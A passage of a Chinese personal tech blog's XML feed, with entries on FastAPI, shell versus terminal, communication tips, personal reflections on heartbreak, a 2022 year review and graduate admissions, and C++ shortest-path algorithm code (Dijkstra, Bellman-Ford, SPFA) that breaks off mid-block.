    <content type="html"><![CDATA[<h2 id="简介-抄的官网"><a href="#简介-抄的官网" class="headerlink" title="简介 (抄的官网)"></a>简介 (抄的官网)</h2><p>FastAPI是一个现代的、快速（高性能）的网络框架，用于在标准Python类型提示的基础上用Python 3.7+构建API。</p><h3 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h3><h4 id="快速："><a href="#快速：" class="headerlink" title="快速："></a>快速：</h4><p>可与 NodeJS 和 Go 比肩的极高性能（归功于 Starlette 和 Pydantic），是最快的 Python web 框架之一</p><h4 id="高效编码"><a href="#高效编码" class="headerlink" title="高效编码"></a>高效编码</h4><p>提高功能开发速度约 200％ 至 300％</p><h4 id="更少的bug"><a href="#更少的bug" class="headerlink" title="更少的bug"></a>更少的bug</h4><p>减少约 40％ 的人为（开发者）导致错误</p><h4 id="使用方便"><a href="#使用方便" class="headerlink" title="使用方便"></a>使用方便</h4><p>极佳的编辑器支持。处处皆可自动补全，减少调试时间</p><h4 id="简单"><a href="#简单" class="headerlink" title="简单"></a>简单</h4><p>设计的易于使用和学习，阅读文档的时间更短</p><h4 id="简短"><a href="#简短" class="headerlink" title="简短"></a>简短</h4><p>使代码重复最小化。通过不同的参数声明实现丰富功能</p><h4 id="鲁棒性"><a href="#鲁棒性" class="headerlink" title="鲁棒性"></a>鲁棒性</h4><p>prod级别的代码。还有自动生成的交互式文档。</p><h4 id="基于标准"><a href="#基于标准" class="headerlink" title="基于标准"></a>基于标准</h4><p>基于（并与）API的开放标准完全兼容：<a href="https://github.com/OAI/OpenAPI-Specification">OpenAPI</a> (previously known as Swagger) and <a href="https://json-schema.org/">JSON Schema</a>.</p>]]></content>
    
    
    <categories>
      
      <category>框架</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>shell与terminal</title>
    <link href="/2023/03/06/shell%E4%B8%8Eterminal/"/>
    <url>/2023/03/06/shell%E4%B8%8Eterminal/</url>
    
    <content type="html"><![CDATA[<p>来自：<a href="https://www.bilibili.com/video/BV16A411675V">https://www.bilibili.com/video/BV16A411675V</a></p><p>大概总结了一些，但还有一些没有理解完全</p><h3 id="Terminal"><a href="#Terminal" class="headerlink" title="Terminal"></a>Terminal</h3><p>传统计算机非常庞大，被安置在单独房间内，操作计算机的人坐在另外的房间，通过设备与计算机进行交互，这种设备就叫做终端设备。</p><p>随着历史的发展，显示也由最初的打印在纸上变为了电子显像管，由于当时显示器的宽度最多为80列，因此很多语言规范规定单行代码最长为80字符。</p><p>现代计算机已经可以做到人手一台，终端设备也早已被取代，这时需要一个程序来模拟传统终端的行为，与传统不兼容图形接口的命令行程序交互。这就是终端模拟器。</p><p>Terminal运行在桌面环境下</p><p>经典桌面环境：GNOME，KDE，Xfcee，deepin</p><p>经典终端模拟器：GNOME Terminal，Alacritty，Dwm，st</p><h3 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h3><p>shell即为运行在Terminal之中的与操作系统交互的程序。</p><p>sh，bash，cmd，powershell都属于shell的实现</p><p>sh：Bourne shell 最经典的Unix shell</p><p>Bash：Bourne-Again shell 目前绝大多数Linux 发行版默认的shell</p><p>Console<br>早期电脑有大量开关和指示器的面板，对电脑进行非常底层的操纵，这个面板就叫做console</p>]]></content>
    
    
    <categories>
      
      <category>OS</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>沟通要点</title>
    <link href="/2023/02/19/%E6%B2%9F%E9%80%9A%E8%A6%81%E7%82%B9/"/>
    <url>/2023/02/19/%E6%B2%9F%E9%80%9A%E8%A6%81%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<h2 id="沟通陷阱："><a href="#沟通陷阱：" class="headerlink" title="沟通陷阱："></a>沟通陷阱：</h2><h3 id="沟通障碍根源：认知偏差。"><a href="#沟通障碍根源：认知偏差。" class="headerlink" title="沟通障碍根源：认知偏差。"></a>沟通障碍根源：认知偏差。</h3><h4 id="偏差来源：语言-行为-观点-认知-价值观"><a href="#偏差来源：语言-行为-观点-认知-价值观" class="headerlink" title="偏差来源：语言&#x2F;行为 观点&#x2F;认知 价值观"></a>偏差来源：语言&#x2F;行为 观点&#x2F;认知 价值观</h4><h5 id="常见倾听问题："><a href="#常见倾听问题：" class="headerlink" title="常见倾听问题："></a>常见倾听问题：</h5><p>没有耐心，急于表达，先入为主，给予反驳，早有成见，情绪激动。</p><h5 id="倾听应注意："><a href="#倾听应注意：" class="headerlink" title="倾听应注意："></a>倾听应注意：</h5><p>1.倾听事实。</p><p>2.倾听情绪和感受。</p><p>3.聚焦意图。</p><h5 id="回应："><a href="#回应：" class="headerlink" title="回应："></a>回应：</h5><p>表示理解&#x3D;&gt;回应事实和感受&#x3D;&gt;提出询问支持，并如何帮助。</p><h5 id="提问："><a href="#提问：" class="headerlink" title="提问："></a>提问：</h5><p>1.收集信息，了解真相。</p><p>2.澄清疑虑，核对想法。</p><p>3.拓展思维，鼓励参与。</p><h5 id="技巧："><a href="#技巧：" class="headerlink" title="技巧："></a>技巧：</h5><p>1.漏斗式提问。</p><p>2.开放式提问。</p><h5 id="表达的三个层次："><a href="#表达的三个层次：" class="headerlink" title="表达的三个层次："></a>表达的三个层次：</h5><p>意见建议&#x3D;&gt;理由，原因&#x3D;&gt;感受。</p><h5 id="互动五步法："><a href="#互动五步法：" class="headerlink" title="互动五步法："></a>互动五步法：</h5><p>1.定方向：目的，重要性。</p><p>2.理情况：（1）事实&#x2F;数据。（2）问题&#x2F;疑虑。</p><p>3.想方案：方向&#x2F;资源&#x2F;支持&#x2F;</p><p>4.明做法：行动计划，追踪应变。</p><p>5.做总结： 要点，承诺&#x2F;信心</p>]]></content>
    
    
    <categories>
      
      <category>随笔</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>重逢</title>
    <link href="/2023/01/18/%E9%87%8D%E9%80%A2/"/>
    <url>/2023/01/18/%E9%87%8D%E9%80%A2/</url>
    
    <content type="html"><![CDATA[<h3 id="写在开头"><a href="#写在开头" class="headerlink" title="写在开头"></a>写在开头</h3><p>人生总是充满着别离，作为一个成年人，要能够接受一个人在任何时间以任何方式离你而去。</p><p>2023年开始，到农历新年这些天，发生了很多很多事，感慨颇多。</p><h3 id="别离"><a href="#别离" class="headerlink" title="别离"></a>别离</h3><p>在2023年的第一天，我向一个很喜欢的女孩子表白被拒绝。然后由此引发了一系列后面的故事。我很喜欢她，她是我认识很久的一位异性好友，但可惜当时我并没有能控制好我自己的情绪，嗯很可能以后也永远也见不到她了。</p><p>我逃离了廊坊，来到了北京，想让狭窄的出租屋，早高峰的地铁和繁忙的工作来麻痹我的神经。但这似乎没有什么特别大的作用，我还是会时不时地想起这件事想起她，从身边的生活中寻找到她的影子。我总是感觉我身边的人都非常的幸福，有的人追求女生最终成功，幸福地在了一起；有的人被女生倒追，每个周末出去玩，十分地恩爱；有的人分分散散刚刚复合，有的人已经见过双方的家长，准备结婚….，只有我一个人像一个小丑一样，被拒绝，然后永远失去了一位非常要好的朋友。</p><h3 id="重逢"><a href="#重逢" class="headerlink" title="重逢"></a>重逢</h3><p>正好14号的周末，我的高中同学们要聚会，我便直接请假到了年底，然后直接买票去了衡水。一方面是为了散心，另一方面是为了看看阔别已久的老师和同学们。</p><p>虽然已经很久没有见过面了，甚至是连微信上都没有说过几句话，但是见了面之后就很快地放开了，大家一起共同经历过那样的3年，我相信即使再过很多年，也还是会一见如故吧。</p><p>大家都变得成熟了许多，在和饭桌上和老师一起开始回忆高中的往事和如今的成长和变化，结束后，又一起聊到早上。</p><p>在来之前，我总是以为自己的眼界已经很宽阔了，但是我错了。</p><p>大连太小了，软院太小了，我自己的圈子就更小了。</p><p>我总是拿我的经历，自己身边的人的经历当作一种普遍的真理，却从来没有想过这可能都是一种偶然呢。</p><p>有的人，在这几年的大学中过得很成功，学习爱情两不误；</p><p>有的人，浑浑噩噩留级休学，但最后幡然醒悟，参透了自己以后的生活的方式；</p><p>有的人，从高中毕业起便开始为了另一个人而活，直到如今分道扬镳后才明白什么是真正地活着。</p><p>有的人， 谈了5年的对象，却被对方青梅竹马的横刀夺爱。</p><p>有的人，家里的经济十分困难，要为了自己的家里的情况处处妥协。</p><p>这样看，我的大学其实还是过得很顺利的，至少我没有经历过这些人间疾苦。</p><p>我突然有些释怀了，我总以为我已经很现实了，但在他们看来，很多事情我还是太年轻太理想了。</p><p>她离开前说：“我们总是喜欢给别人扣上帽子“。</p><p>他用醉酒的眼神望着我说：”我体谅了别人，会有人体谅我么“。</p><p>我可能总是会从它人的角度取思考一些问题，去思考一些事情，我以为这样就可以体谅到别人的感受了。</p><p>可是，让我从它人的角度去思考是我以我的经历和感受去思考的。我们每个人的经历，性格思想都不相同，如果这样去思考很可能在一些情况下推导出对方错误的动机与想法，为他人扣上了”帽子“。</p><p>我总是用我的少得可怜的经历去想象她的行为的动机，虚构出来了我想象出来的完美形象，从来没有真正地了解过她吧，因此对现实的不一致产生了如此大的情绪波动，导致了最坏的结果。</p><p>虽然这件事的结果肯定不是我一个人的问题，但能从这件事中不断地成长就好了。</p><p>感谢这几天的经历与思想的交流，希望所有人都能有一个美好的未来吧。</p>]]></content>
    
    
    <categories>
      
      <category>随笔</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2022review</title>
    <link href="/2023/01/01/2022review/"/>
    <url>/2023/01/01/2022review/</url>
    
    <content type="html"><![CDATA[<p>随着2022年1月买的服务器到期，我把这一年所写的东西全部迁了出来，放到github上了。也趁此机会写个年终总结吧。</p><p>提笔写的时候在看Asoul的直播，写完估计已经到了2023年了。2022年发生的事情太多了，确实很值得去写个总结去纪念一下。</p><h3 id="保研"><a href="#保研" class="headerlink" title="保研"></a>保研</h3><p>保研可能是贯穿2022年的主线吧，从正常来说，从2022年的1月份就应该开始了，但可惜我1月份的时候什么都不懂。3月份开学进学校，可能到5月份才搞懂什么是真正的保研，这样直到9月份走了很多很多的弯路，在路途中也emo了很久很久。对于保研很具体的感悟就可以看另一篇保研的博客吧。</p><h3 id="实习"><a href="#实习" class="headerlink" title="实习"></a>实习</h3><p>在保研后，尝试去找了实习。在实习中也再次认识到了现在就业形势的严峻。因为是刚保研完，没有准备什么多久，就投了认为开始投了很多家，但是都没有回应。</p><p>字节给了面试，但可惜，一面就挂了，面评也很不好，所以再投都直接简历挂了。</p><p>然后就是面试了美团，靠的是室友直接进行的内推，主管人很好，也确实缺人，两轮面试就直接过了。但很不幸，刚接完了offer，第二天就立刻出现了疫情，不能进京。联想到后面的事情，其实也算是一种幸运吧。开始了线上的实习，主要写前端Vue。线上实习很舒服，不需要租房的费用，不需要通勤，不需要花钱去吃饭。北京疫情封锁，再北京实习的很多人都处于吃不上饭的状态，然后戏剧性的放开，北京基本所有的人都阳了。我因为线上的实习躲过了这两拨，虽然最后也还是阳了，但是很庆幸躲过了这几波。但是随着大部分人的阳康，过几天也要去线下办公了。组内的员工都是老员工，至少线上的时候体验非常不错，还是期待一波线下吧。</p><h3 id="游戏"><a href="#游戏" class="headerlink" title="游戏"></a>游戏</h3><p>2022的上半年因为准备保研的关系，基本每天没有打游戏的时间。保研由于有了工资，陈趁着秋促和冬促入手了不少的游戏，也玩了很多。 战雷一直在玩，到了今年结束的时候把很难开的中系陆战开到了顶级房，用99A把KD打正。然后迷上了空战，中系的空战也开到了J7E，在打的过程中也在录屏收集素材，打算做个击杀集锦，看来只能过两天再说了。</p><p>单机的游戏，今年玩的体验最深的有2款游戏，冰汽时代，赛博朋克2077。</p><p>冰汽时代是在封城的时候玩的，也算很有感触吧，开始对于越界的争议，到后来评价的转变尤其是联想到疫情再有steam下面的评论，都很值得去思考。我们成功的躲过了风暴，我不知道这是否值得，但我庆幸我自己生存了下来。</p><p>2077与刚出时的对比现在能算上是一个合格的大作了，虽然还是有很多的bug。但剧情人设背景非常优秀，以及作为一个RPG游戏的打击感，做的本土化配音也十分的优秀，很沉浸。2077也许能做的更好吧，这种优秀的世界观的设定，总让人有无限的遐想。</p><h3 id="二次元"><a href="#二次元" class="headerlink" title="二次元"></a>二次元</h3><p>什么是二次元呢，V圈也算二次元吧（。</p><p>2022的上半年有在推猫雷，后来出现了y&gt;b事件后，就渐渐脱粉了，虽然确实猫雷很可爱，声音也很好听，再后来猫雷毕业了，据说是转生了，后来也就没再继续关注了。</p><p>当然同时也一直又在看A，一起经历了510事件，在这个过程中认识到了公众舆论被误导的后果。虽然我不是团推没有受到珈乐休眠的多少影响，但看到她们被攻击还是挺伤心的。好在后来2周年也成功的举办了，舆论的封口也回转了，我也一起与Asoul度过了2022。2022年的许多欢乐都是嘉然向晚她们带来的，很感谢她们，希望2023年能继续陪伴。</p><p>除了皮套人外，也补了不少的动漫，一些经典的作品 例如巨人，鬼灭。也在闲暇的时候看完了，也很庆幸今年10月新番非常给力，死神让我找回了初中小学时的感觉。还有非常好看的电锯人，孤独摇滚。</p><h3 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h3><p>在这一年里，我也干了其他很多事吧。和同学一起去健身，在保研的空隙去爬二期的山，去开无人机。去参加夜跑活动等等等等。也在空余的时间学了一些Pr剪了一些的视频。基本属于最简单的剪辑了，也发到了b站上面。这两天也打算剪几个高级点费时费力的混剪hhh，希望播放量能够高点。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>2022年经历的事情有很多，经历了保研和找实习的磨练，我感觉我的社交能力也渐渐有了些增长，渐渐地也不那么社恐了，自己的心理素质有了很大的提升。我感觉这就是很大的成长吧。发邮件联系老师，参加很多轮的面试。</p><p>虽然因为社恐和口才差吃了很多亏，好在最后也有了一个不错的结果，最重要的是在这一年成长了许多。感谢2022年遇到的人和事让我有了这些的成长吧。希望2023年能一切顺利。</p>]]></content>
    
    
    <categories>
      
      <category>随笔</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>保研随笔</title>
    <link href="/2022/10/08/%E4%BF%9D%E7%A0%94%E9%9A%8F%E7%AC%94/"/>
    <url>/2022/10/08/%E4%BF%9D%E7%A0%94%E9%9A%8F%E7%AC%94/</url>
    
    <content type="html"><![CDATA[<p>当写下这篇文章时，已经是10月8日晚上了，距离928已经过去了一周有余，还是打算用文字来记录一下吧。</p><p>故事有点长，都不知道从哪里写起了，这将近半年中虽然收到了很多很多人的帮助，但还是走了很多的弯路。</p><p>从3月份开始说吧，假期和L佬商量好看能不能，从容易的CV方向，写个在投论文，能对保研有帮助。可惜3月份的我啥也不懂，虽然可能知道，有一篇哪怕在投在夏令营都是乱杀，但我把大部分时间花费在了机试和专业课程上。</p><p>专业课程中，接了Y老师一个小项目，Y老师也邀请我做一些科研。这样，我同时接下了两个大活吧，我以为我都能做好，但事实证明，人的精力是有限的，想同时把多方面做好是很困难的，所以结果是项目寄+论文寄，g++。</p><p>5月份，q上岸了tju，应该是我们这届最早上岸了的吧hhhh。顿时感到十分焦虑，开始四处问学长，搜集信息，和一起保研的同学交流，感谢学长学姐们的无私分享，也算基本搞清楚保研大概是咋回事了。</p><p>6月赶着回家前考了六级和CSP，宅在家中正式开始夏令营。</p><h3 id="夏令营日寄"><a href="#夏令营日寄" class="headerlink" title="夏令营日寄"></a>夏令营日寄</h3><p>总得来说，夏令营我的投递策略是彻彻底底的失误。我非常想去北京（是廊坊人的执念嘛hhhh），所以特别地投递了这些学校，而没有投递一些中久保底。<br>抛开没有入营的，大概说一说面了的学校吧，由于各种协议，就不说具体问题了。</p><h4 id="BUAA"><a href="#BUAA" class="headerlink" title="BUAA"></a>BUAA</h4><p>第一个参加的是buaa吧，buaa非常喜欢打ACM强的学生，可惜，我不是。<br>机试是2道大模拟，OI赛制，我第一题应该是做出来了，但没时间调整输出的格式，所以爆零了。</p><p>对，我为什么要参加机试，我不是考了CSP了吗，但当初报名的时候，我编程语言选的ALL，而buaa要求C&#x2F;C++，（虽然我CSP也全用C&#x2F;C++写的</p><p>buaa的面试，很硬核，政治数学专业课，我面得中规中距吧，被老师cue了说话带东北味hhh，在大连呆得时间长了呢。</p><p>当晚出结果，机试爆0理所当然，wl都没进，寄。</p><h4 id="RUC"><a href="#RUC" class="headerlink" title="RUC"></a>RUC</h4><p>信院也有机试，CSP不要要求语言，可以抵，但我很心高气傲的，觉得我当场发挥能更好，结果自然是寄。</p><p>信院的面试应该是我所有面试中面得最差的一次了，英语问题磕磕绊绊，专业问题名词没有听过，整体呈现了一个很不自信的状态。</p><p>wl都没进，寄。</p><h4 id="SJTU"><a href="#SJTU" class="headerlink" title="SJTU"></a>SJTU</h4><p>电院网安，没有机试。面试三个专业问题，回答上来两个，一个真的从来没有接触过。老师虽然很友善但，好像很嫌弃我没有论文（哭），最后是候补，927最后候补给了专硕，sjtu专硕没住宿而且很贵，加上发邮件的时候正好午休（，所以也直接拒了。</p><h4 id="信工所"><a href="#信工所" class="headerlink" title="信工所"></a>信工所</h4><p>信工所本来认为是稳拿的offer,但同上，当时心高气傲，非得要面一个强导，面了两轮。面试主要是追问项目问题，但也会夹杂一些专业问题，一个扩展欧几里得定理没有答出，进了wl，到最后也没有接到候补的消息。</p><p>综上，夏令营结束为0offer，但我还是天真地以为能够候补上，于是中间小摆了一段时间，然后不知不觉来到预推免。</p><h3 id="预推免日寄"><a href="#预推免日寄" class="headerlink" title="预推免日寄"></a>预推免日寄</h3><p>来到9月份，候补一点消息都没有，彻彻底底慌了，恐怕真的没有学上，好在最后还是有了offer,写写最终去向和印象特别深的吧。</p><h4 id="软件所"><a href="#软件所" class="headerlink" title="软件所"></a>软件所</h4><p>面试软件所感觉也是比较差，（面几个学校没有面试发挥超常的，也是主要问的专业问题。也不知道当时太困，还是啥原因，RSA居然没有答出来。唉，好在最后还是给了offer，也定为最终去向了。</p><h4 id="fdu"><a href="#fdu" class="headerlink" title="fdu"></a>fdu</h4><p>fdu的面试非常麻烦，分了三天，分别机试，英语，专业面。机试又是oi赛制，草，讨厌oi赛制，面试的时候老师说机试很不理想，我第一题就是0分。专业面试感觉是压力面，让我讲讲我的项目，但讲完把项目简单化，老师感觉非常看不起我（哭），结果又是wl都没有，寄。</p><h3 id="后记-感悟"><a href="#后记-感悟" class="headerlink" title="后记&amp;感悟"></a>后记&amp;感悟</h3><p>随着928的到来，一切也都尘埃落定。我感觉今年的状况，捡漏的性价比是越来越高了，看到绿裙很多群友捡漏上了华五。</p><p>虽然走了很多的弯路，但好在最后offer去了自己想去的城市，能够做想做的方向。</p><p>人的命运，在不到半小时的时间里，被老师可能随便问得几个问题决定了。</p><p>我本来就是一个比较内向的人，不是非常擅长交际，这也可能是面试多次失败的原因之一吧。</p><p>大学这几年，因为保研和我的性格，错失了很多东西。但随着一路走来，我也在不断成长吧，从最开始发邮件，开摄像头的都十分害怕的我，到现在也算能适应这种交际了吧。</p><p>有时很羡慕别人的经历，有的从大一就开始科研，最终去了top2强组，能够拿到上万的奖学金。有的很早轻松推荐上岸，在南方实习，能够欣赏江南的美景。有的人善于社会工作，能够认识很多很多的人。</p><p>或许这也是命运吧，从很早的某一个选择起，从很早的一件事情开始，人的差异便逐渐产生了，最终决定了各自的命运。</p><p>但仔细想想，沿途走来，我也在不断成长，收获颇丰，圈子虽然很小，但认识的都是非常非常好的人。</p><p>可能保研过来最大的收获，就是成长与心态的改变吧。</p><p>人各有命</p><p>但并不影响我们各自精彩</p>]]></content>
    
    
    <categories>
      
      <category>随笔</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Dijkstra算法</title>
    <link href="/2022/08/28/%E8%BF%AA%E6%9D%B0%E6%96%AF%E7%89%B9%E6%8B%89/"/>
    <url>/2022/08/28/%E8%BF%AA%E6%9D%B0%E6%96%AF%E7%89%B9%E6%8B%89/</url>
    
    <content type="html"><![CDATA[<p>Dijkstra算法是一种最短路径路由算法,用于求单源最短路径，但其要求边权不能为负值。<br>bellman-ford算法也是用来去单源最短路径，但是其边权可以负值。<br>spfa算法为bellman-ford的算法的优化版本，在有些情况下能够实现较小的时间复杂度。<br>核心实现部分。<br>Dijkstra:利用贪心的思想，每次加入最近的未访问节点，从而得到最短路径。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">dijkstra</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">//所有节点距离起点的距离初始化为无穷大</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>    &#123;<br>        dist[i] = inf;<br>    &#125;<br>    <span class="hljs-comment">//起点距离自己的距离为零</span><br>    dist[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">//迭代n次，每次可以确定一个点到起点的最短路</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; ++i) &#123;<br>        <span class="hljs-type">int</span> t = <span class="hljs-number">-1</span>;<br>        <span class="hljs-comment">//t的作用？</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; ++j) &#123;<br>            <span class="hljs-comment">//不在s集合，并且</span><br>            <span class="hljs-comment">//如果没有更新过，则进行更新， 或者发现更短的路径，则进行更新</span><br>            <span class="hljs-keyword">if</span> (!st[j] &amp;&amp; (t == <span class="hljs-number">-1</span> || dist[j] &lt; dist[t])) &#123;<br>                t = j;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">//加入到s集合中</span><br>        st[t] = <span class="hljs-literal">true</span>;<br><br>        <span class="hljs-comment">//找到了距离最小的点t，并用最小的点t去更新其他的点到起点的距离</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; ++j) &#123;<br>            dist[j] = <span class="hljs-built_in">min</span>(dist[j], dist[t] + g[t][j]);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 如果起点到达不了n号节点，则返回-1</span><br>    <span class="hljs-keyword">if</span> (dist[n] == inf) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-comment">// 返回起点距离n号节点的最短距离</span><br>    <span class="hljs-keyword">return</span> dist[n];<br>&#125;<br></code></pre></td></tr></table></figure><p>Dijkstra 还可以进行堆优化，可使用STL优先队列。<br>从O(n2)优化为O(nlogn)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">dijstrkual</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    dist[<span class="hljs-number">1</span>] =<span class="hljs-number">0</span>;<br>    pq.<span class="hljs-built_in">push</span>(&#123;<span class="hljs-number">0</span>,<span class="hljs-number">1</span>&#125;);<br>    <span class="hljs-keyword">while</span>(!pq.<span class="hljs-built_in">empty</span>())<br>    &#123;<br>        <span class="hljs-keyword">auto</span> t = pq.<span class="hljs-built_in">top</span>();<br>        pq.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-type">int</span> distance = t.first;<br>        <span class="hljs-type">int</span> u = t.second;<br>        <span class="hljs-keyword">if</span>(vis[u])<span class="hljs-keyword">continue</span>;<br>        <span class="hljs-keyword">else</span> vis[u] = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span>&amp;v:gra[u])<br>        &#123;<br>            <span class="hljs-type">int</span> y = v.first;<br>            <span class="hljs-type">int</span> d = v.second;<br>            <span class="hljs-keyword">if</span>(dist[y]&gt;distance+d)<br>            &#123;<br>                dist[y] = distance+d;<br>                pq.<span class="hljs-built_in">push</span>(&#123;dist[y],y&#125;);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dist[n];<br>&#125;<br></code></pre></td></tr></table></figure><p>bellman-ford:循环遍历图中的所有边，对图中的边进行松弛操作，从而得到可能的最短路径。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">bellman_ford</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    dist[<span class="hljs-number">1</span>]=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;k;i++)<span class="hljs-comment">//第次i松弛操作保证了所有深度为i的路径最短</span><br>    &#123;<br>        vector&lt;<span class="hljs-type">int</span>&gt;last = dist;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;=m;j++)<br>        &#123;<br>            <span class="hljs-type">int</span> a = edges[j][<span class="hljs-number">0</span>];<br>            <span class="hljs-type">int</span> b = edges[j][<span class="hljs-number">1</span>];<br>            <span class="hljs-type">int</span> w = edges[j][<span class="hljs-number">2</span>];<br>            dist[b] = <span class="hljs-built_in">min</span>(dist[b],last[a]+w);<span class="hljs-comment">//保证每次只更新一次，防止串联</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dist[n];<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>spfa：SPFA 算法是 Bellman-Ford算法 的队列优化算法的别称，它的优化思路是利用了搜索的思想，只将对更新了距离的节点加入队列，因为只有更新了距离的节点才对后续的松弛操作有影响。<br>优化方式：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">spfa</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    queue&lt;<span class="hljs-type">int</span>&gt;q;<br>    q.<span class="hljs-built_in">push</span>(<span class="hljs-number">1</span>);<br>    dist[<span class="hljs-number">1</span>]=<span class="hljs-number">0</span>;<br>    vis[<span class="hljs-number">1</span>]=<span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">while</span>(!q.<span class="hljs-built_in">empty</span>())<br>    &#123;<br>        <span class="hljs-type">int</span> u = q.<span class="hljs-built_in">front</span>();<br>        q.<span class="hljs-built_in">pop</span>();<br>        vis[u]=<span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span>&amp;vp:gra[u])<br>        &#123;<br>            <span class="hljs-type">int</span> v = vp.first;<br>            <span class="hljs-type">int</span> d = vp.second;<br>            <span class="hljs-keyword">if</span>(dist[v]&gt;dist[u]+d)<br>            &#123;<br>                dist[v] = dist[u]+d;<br>                <span class="hljs-keyword">if</span>(!vis[v])<br>                &#123;<br>                    q.<span class="hljs-built_in">push</span>(v);<br>                    vis[v] =<span class="hljs-literal">true</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dist[n];<br>&#125;<br></code></pre></td></tr></table></figure><p>和Dijkstra很像，但Dijkstra是贪心，每次更新一点，而spfa是对所有的边都进行松弛。<br>spfa还可以进行判断负环操作。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 